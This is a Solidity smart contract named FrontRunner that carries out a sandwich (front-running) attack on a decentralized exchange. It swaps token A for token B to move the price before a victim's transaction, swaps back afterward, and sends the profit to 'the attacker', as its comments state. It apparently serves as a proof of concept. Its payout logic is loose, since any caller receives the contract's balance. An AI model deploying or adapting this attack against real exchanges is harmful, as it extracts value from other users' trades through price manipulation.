// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IMultiDEX {
	function swapTokenToToken(
		address _tokenIn,
		address _tokenOut,
		uint256 _tokensSold,
		uint256 _expectedPriceUSD
	) external;
}

contract FrontRunner {
	IMultiDEX public multiDex;
	IERC20 public tokenA;
	IERC20 public tokenB;

	constructor(address _multiDex, address _tokenA, address _tokenB) {
		multiDex = IMultiDEX(_multiDex);
		tokenA = IERC20(_tokenA);
		tokenB = IERC20(_tokenB);
	}

	function manipulatePrice(uint256 _amountA) public {
		// 1. Swap token A for token B to manipulate the price
		tokenA.transferFrom(msg.sender, address(this), _amountA);
		tokenA.approve(address(multiDex), _amountA);
		multiDex.swapTokenToToken(
			address(tokenA),
			address(tokenB),
			_amountA,
			0
		);
	}

	    // 2. target transaction executes here

	function completeFrontRun() public {
		// 3. Swap back token B to token A to revert the price
		uint256 amountB = tokenB.balanceOf(address(this));
		tokenB.approve(address(multiDex), amountB);
		multiDex.swapTokenToToken(address(tokenB), address(tokenA), amountB, 0);

        // 4. Send the profit to the attacker
        tokenA.transfer(msg.sender, tokenA.balanceOf(address(this)));
	}
}
